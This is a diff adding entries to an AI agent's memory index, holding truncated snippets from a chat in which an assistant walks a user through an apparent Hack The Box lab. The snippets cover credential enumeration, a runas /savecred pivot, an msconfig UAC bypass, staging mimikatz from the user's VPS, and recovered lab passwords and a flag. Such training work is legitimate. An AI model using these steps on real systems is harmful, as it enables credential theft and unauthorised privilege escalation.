+      "snippet": "User: Conversation info (untrusted metadata): ```json { \"message_id\": \"3697\", \"sender_id\": \"8154042516\", \"sender\": \"Victor Paolo Reyes\", \"timestamp\": \"Fri 2026-04-17 13:16 GMT+8\" } ``` Sender (untrusted metadata): ```json { \"label\": \"Victor Paolo Reyes (8154042516)\", \"id\": \"81540",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "message-id",
+        "sender-id",
+        "user",
+        "conversation",
+        "info",
+        "untrusted",
+        "metadata",
+        "sender"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:18:18": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:18:18",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 18,
+      "endLine": 18,
+      "source": "memory",
+      "snippet": "Assistant: Excellent! Now you're `mcharles` and you can see the **OneDrive credential** stored: ``` Target: LegacyGeneric:target=onedrive.live.com User: mcharles@inlanefreight.local ``` But `cmdkey` only shows the **username**, not the **password**. To get the actual password, yo",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "onedrive.live.com",
+        "inlanefreight.local",
+        "assistant",
+        "excellent",
+        "now",
+        "you're",
+        "mcharles",
+        "you"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:19:19": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:19:19",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 19,
+      "endLine": 19,
+      "source": "memory",
+      "snippet": "User: [media attached: /home/openclaw/.openclaw/media/inbound/file_79---0707a1a1-9272-448f-851a-671dc1f1f705.jpg (image/jpeg) | /home/openclaw/.openclaw/media/inbound/file_79---0707a1a1-9272-448f-851a-671dc1f1f705.jpg] To send an image back, prefer the message tool (media/path/fi",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "home/openclaw",
+        "openclaw/media/inbound/file-79",
+        "image/jpeg",
+        "media/path/fi",
+        "user",
+        "media",
+        "attached",
+        "home"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:20:20": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:20:20",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 20,
+      "endLine": 20,
+      "source": "memory",
+      "snippet": "Assistant: Fair — let's try the **msconfig UAC bypass** to get an elevated shell. This is a classic technique. ## msconfig UAC Bypass Steps **Step 1 — Launch msconfig:** ```cmd msconfig ``` **Step 2 — In the msconfig GUI:** 1. Go to the **Tools** tab 2. Scroll down and select **C",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "assistant",
+        "fair",
+        "let's",
+        "try",
+        "the",
+        "msconfig",
+        "uac",
+        "bypass"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:21:21": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:21:21",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 21,
+      "endLine": 21,
+      "source": "memory",
+      "snippet": "User: [media attached: /home/openclaw/.openclaw/media/inbound/file_80---a7c9169a-9af4-46d5-9c3d-2bb81c3ebedf.jpg (image/jpeg) | /home/openclaw/.openclaw/media/inbound/file_80---a7c9169a-9af4-46d5-9c3d-2bb81c3ebedf.jpg] To send an image back, prefer the message tool (media/path/fi",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "home/openclaw",
+        "openclaw/media/inbound/file-80",
+        "image/jpeg",
+        "media/path/fi",
+        "user",
+        "media",
+        "attached",
+        "home"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:22:22": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:22:22",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 22,
+      "endLine": 22,
+      "source": "memory",
+      "snippet": "Assistant: The UAC prompt means `msconfig` is requesting elevation with **admin credential validation** — this happens when: 1. The user isn't in Administrators group, OR 2. UAC is set to \"Always notify\" and requires explicit admin creds **First, check if mcharles is actually an",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "assistant",
+        "the",
+        "uac",
+        "prompt",
+        "means",
+        "msconfig",
+        "requesting",
+        "elevation"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:23:23": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:23:23",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 23,
+      "endLine": 23,
+      "source": "memory",
+      "snippet": "User: [media attached: /home/openclaw/.openclaw/media/inbound/file_81---8fe8c7f1-1199-4613-9852-0fa0997f6495.jpg (image/jpeg) | /home/openclaw/.openclaw/media/inbound/file_81---8fe8c7f1-1199-4613-9852-0fa0997f6495.jpg] To send an image back, prefer the message tool (media/path/fi",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "home/openclaw",
+        "openclaw/media/inbound/file-81",
+        "image/jpeg",
+        "media/path/fi",
+        "user",
+        "media",
+        "attached",
+        "home"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:24:24": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:24:24",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 24,
+      "endLine": 24,
+      "source": "memory",
+      "snippet": "Assistant: Perfect — msconfig opened as `mcharles` **without UAC**. Now for the bypass: **In the msconfig window:** 1. Click the **\"Tools\"** tab (next to Startup) 2. Scroll down the list and select **\"Command Prompt\"** 3. Click **\"Launch\"** This spawns cmd.exe with **elevated pri",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "cmd.exe",
+        "assistant",
+        "perfect",
+        "msconfig",
+        "opened",
+        "mcharles",
+        "without",
+        "uac"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:25:25": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:25:25",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 25,
+      "endLine": 25,
+      "source": "memory",
+      "snippet": "User: [media attached: /home/openclaw/.openclaw/media/inbound/file_82---f165ca42-363b-4e0a-a75d-4e2ffe719bee.jpg (image/jpeg) | /home/openclaw/.openclaw/media/inbound/file_82---f165ca42-363b-4e0a-a75d-4e2ffe719bee.jpg] To send an image back, prefer the message tool (media/path/fi",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "home/openclaw",
+        "openclaw/media/inbound/file-82",
+        "image/jpeg",
+        "media/path/fi",
+        "user",
+        "media",
+        "attached",
+        "home"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:26:26": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:26:26",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 26,
+      "endLine": 26,
+      "source": "memory",
+      "snippet": "Assistant: Excellent — **elevated Administrator shell achieved!** 🎯 **First — check for mimikatz in other locations:** ```cmd dir /s C:\\mimikatz.exe 2>nul dir /s C:\\Tools\\mimikatz.exe 2>nul dir C:\\Users\\Administrator\\Downloads\\mimikatz* 2>nul ``` **If not found — you have option",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "mimikatz.exe",
+        "assistant",
+        "excellent",
+        "elevated",
+        "administrator",
+        "shell",
+        "achieved",
+        "first"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:27:27": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:27:27",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 27,
+      "endLine": 27,
+      "source": "memory",
+      "snippet": "User: Conversation info (untrusted metadata): ```json { \"message_id\": \"3712\", \"sender_id\": \"8154042516\", \"sender\": \"Victor Paolo Reyes\", \"timestamp\": \"Fri 2026-04-17 14:44 GMT+8\" } ``` Sender (untrusted metadata): ```json { \"label\": \"Victor Paolo Reyes (8154042516)\", \"id\": \"81540",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "message-id",
+        "sender-id",
+        "user",
+        "conversation",
+        "info",
+        "untrusted",
+        "metadata",
+        "sender"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:28:28": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:28:28",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 28,
+      "endLine": 28,
+      "source": "memory",
+      "snippet": "Assistant: Perfect — you have mimikatz on your VPS. **Transfer it to the target:** **On your VPS (foothold or attacking machine):** ```bash cd /usr/share/windows-resources/mimikatz/x64 python3 -m http.server 8080 ``` **On the target (elevated Administrator shell):** ```cmd cd %TE",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "http.server",
+        "assistant",
+        "perfect",
+        "you",
+        "mimikatz",
+        "your",
+        "vps",
+        "transfer"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:29:29": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:29:29",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 29,
+      "endLine": 29,
+      "source": "memory",
+      "snippet": "User: Conversation info (untrusted metadata): ```json { \"message_id\": \"3715\", \"sender_id\": \"8154042516\", \"sender\": \"Victor Paolo Reyes\", \"timestamp\": \"Fri 2026-04-17 14:50 GMT+8\" } ``` Sender (untrusted metadata): ```json { \"label\": \"Victor Paolo Reyes (8154042516)\", \"id\": \"81540",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "message-id",
+        "sender-id",
+        "user",
+        "conversation",
+        "info",
+        "untrusted",
+        "metadata",
+        "sender"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:30:30": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:30:30",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 30,
+      "endLine": 30,
+      "source": "memory",
+      "snippet": "Assistant: **Flag captured:** `proofs1insight1rustles!` ✅ **Attack chain completed:** 1. `sadams` → enumerated stored creds (`cmdkey /list`) 2. `cmdkey /list` → found `SRV01\\mcharles` credential 3. `runas /savecred` → became `mcharles` without password 4. `msconfig` → UAC bypass",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "assistant",
+        "flag",
+        "captured",
+        "proofs1insight1rustles",
+        "attack",
+        "chain",
+        "completed",
+        "sadams"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:31:31": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:31:31",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 31,
+      "endLine": 31,
+      "source": "memory",
+      "snippet": "User: Conversation info (untrusted metadata): ```json { \"message_id\": \"3718\", \"sender_id\": \"8154042516\", \"sender\": \"Victor Paolo Reyes\", \"timestamp\": \"Fri 2026-04-17 14:55 GMT+8\" } ``` Sender (untrusted metadata): ```json { \"label\": \"Victor Paolo Reyes (8154042516)\", \"id\": \"81540",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "message-id",
+        "sender-id",
+        "user",
+        "conversation",
+        "info",
+        "untrusted",
+        "metadata",
+        "sender"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:32:32": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:32:32",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 32,
+      "endLine": 32,
+      "source": "memory",
+      "snippet": "Assistant: Correct — the **OneDrive web credential** (`mcharles@inlanefreight.local` / `Inlanefreight#2025`) was in **mcharles' own Credential Manager**, not sadams'. **Attack chain refined:** 1. `sadams` → `cmdkey /list` → found `SRV01\\mcharles` **domain credential** 2. `runas /",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "inlanefreight.local",
+        "assistant",
+        "correct",
+        "the",
+        "onedrive",
+        "web",
+        "credential",
+        "mcharles"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:33:33": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:33:33",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 33,
+      "endLine": 33,
+      "source": "memory",
+      "snippet": "Assistant: Documentation is already updated with both credentials: | Credential Type | Value | |----------------|-------| | mcharles **domain** password | `proofs1insight1rustles!` | | mcharles **OneDrive** password | `Inlanefreight#2025` | **Assessment complete** ✅ — Password At",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "assistant",
+        "documentation",
+        "already",
+        "updated",
+        "both",
+        "credentials",
+        "credential",
+        "type"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:34:34": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:34:34",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 34,
+      "endLine": 34,
+      "source": "memory",
+      "snippet": "User: Conversation info (untrusted metadata): ```json { \"message_id\": \"3725\", \"sender_id\": \"8154042516\", \"sender\": \"Victor Paolo Reyes\", \"timestamp\": \"Fri 2026-04-17 14:59 GMT+8\" } ``` Sender (untrusted metadata): ```json { \"label\": \"Victor Paolo Reyes (8154042516)\", \"id\": \"81540",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "message-id",
+        "sender-id",
+        "user",
+        "conversation",
+        "info",
+        "untrusted",
+        "metadata",
+        "sender"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:35:35": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:35:35",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 35,
+      "endLine": 35,
+      "source": "memory",
+      "snippet": "Assistant: Understood — this was **section exercises**, not the full Skills Assessment. Let me clean up the assessment.md and capture these techniques in the playbooks.",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "assessment.md",
+        "assistant",
+        "understood",
+        "was",
+        "section",
+        "exercises",
+        "not",
+        "the"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:36:36": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:36:36",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 36,
+      "endLine": 36,
+      "source": "memory",
+      "snippet": "Assistant: Done. Two updates: **1. assessment.md** — Reset to \"Not Started\" (pending actual skills assessment) **2. New playbook created:** `htb/playbooks/windows-credential-manager-extraction.md` **Playbook includes:** - `cmdkey /list` enumeration - `runas /savecred` lateral mov",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "assessment.md",
+        "assistant",
+        "done",
+        "two",
+        "updates",
+        "reset",
+        "not",
+        "started"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:37:37": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:37:37",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 37,
+      "endLine": 37,
+      "source": "memory",
+      "snippet": "User: Conversation info (untrusted metadata): ```json { \"message_id\": \"3733\", \"sender_id\": \"8154042516\", \"sender\": \"Victor Paolo Reyes\", \"timestamp\": \"Fri 2026-04-17 15:12 GMT+8\" } ``` Sender (untrusted metadata): ```json { \"label\": \"Victor Paolo Reyes (8154042516)\", \"id\": \"81540",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "message-id",
+        "sender-id",
+        "user",
+        "conversation",
+        "info",
+        "untrusted",
+        "metadata",
+        "sender"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:38:38": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:38:38",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 38,
+      "endLine": 38,
+      "source": "memory",
+      "snippet": "Assistant: Good observation. Let me research this behavior and add it to the playbook.",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "assistant",
+        "good",
+        "observation",
+        "let",
+        "research",
+        "behavior",
+        "add",
+        "the"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:39:39": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:39:39",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 39,
+      "endLine": 39,
+      "source": "memory",
+      "snippet": "Assistant: Based on my analysis, here's the technical explanation: ## Why `cmdkey /list` triggered the credentials to appear **The key insight:** Windows uses **lazy loading** for user profiles and Credential Manager vaults. ### What Happened | Stage | State | Available to `sekur",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "assistant",
+        "based",
+        "analysis",
+        "here's",
+        "the",
+        "technical",
+        "explanation",
+        "why"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:40:40": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:40:40",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 40,
+      "endLine": 40,
+      "source": "memory",
+      "snippet": "Assistant: Playbook updated with the **Lazy Loading** behavior: **Key finding:** Windows only loads Credential Manager vaults into LSASS memory **on-demand** — when `cmdkey` or another application accesses them. **Without `cmdkey /list` first:** - Vault stays encrypted on disk -",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "on-demand",
+        "assistant",
+        "playbook",
+        "updated",
+        "the",
+        "lazy",
+        "loading",
+        "behavior"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:41:41": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:41:41",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 41,
+      "endLine": 41,
+      "source": "memory",
+      "snippet": "User: Conversation info (untrusted metadata): ```json { \"message_id\": \"3742\", \"sender_id\": \"8154042516\", \"sender\": \"Victor Paolo Reyes\", \"timestamp\": \"Fri 2026-04-17 15:29 GMT+8\" } ``` Sender (untrusted metadata): ```json { \"label\": \"Victor Paolo Reyes (8154042516)\", \"id\": \"81540",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "message-id",
+        "sender-id",
+        "user",
+        "conversation",
+        "info",
+        "untrusted",
+        "metadata",
+        "sender"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:42:42": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:42:42",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 42,
+      "endLine": 42,
+      "source": "memory",
+      "snippet": "Assistant: Yes — the **Lazy Loading** research is now in the playbook. Here's what was captured: **Location:** `htb/playbooks/windows-credential-manager-extraction.md` under \"Critical Behavior: Lazy Loading\" **Key points documented:** 1. **Why credentials don't appear immediately",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "assistant",
+        "yes",
+        "the",
+        "lazy",
+        "loading",
+        "research",
+        "now",
+        "playbook"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:43:43": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:43:43",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 43,
+      "endLine": 43,
+      "source": "memory",
+      "snippet": "User: Conversation info (untrusted metadata): ```json { \"message_id\": \"3749\", \"sender_id\": \"8154042516\", \"sender\": \"Victor Paolo Reyes\", \"timestamp\": \"Fri 2026-04-17 15:32 GMT+8\" } ``` Sender (untrusted metadata): ```json { \"label\": \"Victor Paolo Reyes (8154042516)\", \"id\": \"81540",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "message-id",
+        "sender-id",
+        "user",
+        "conversation",
+        "info",
+        "untrusted",
+        "metadata",
+        "sender"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:44:44": {
+      "key": "memory:memory/.dreams/session-corpus/2026-04-17.txt:44:44",
+      "path": "memory/.dreams/session-corpus/2026-04-17.txt",
+      "startLine": 44,
+      "endLine": 44,
+      "source": "memory",
+      "snippet": "Assistant: Got it — **Credential Hunting in Network Traffic** section. Let me update the module with this content.",
+      "recallCount": 0,
+      "dailyCount": 1,
+      "groundedCount": 0,
+      "totalScore": 0.58,
+      "maxScore": 0.58,
+      "firstRecalledAt": "2026-04-17T19:00:03.454Z",
+      "lastRecalledAt": "2026-04-17T19:00:03.454Z",
+      "queryHashes": [
+        "d5bd631cdecb"
+      ],
+      "recallDays": [
+        "2026-04-17"
+      ],
+      "conceptTags": [
+        "network",
+        "assistant",
+        "got",
+        "credential",
+        "hunting",
+        "traffic",
+        "section",
+        "let"
+      ]
+    },
+    "memory:memory/.dreams/session-corpus/2026-04-17.txt:45:45": {
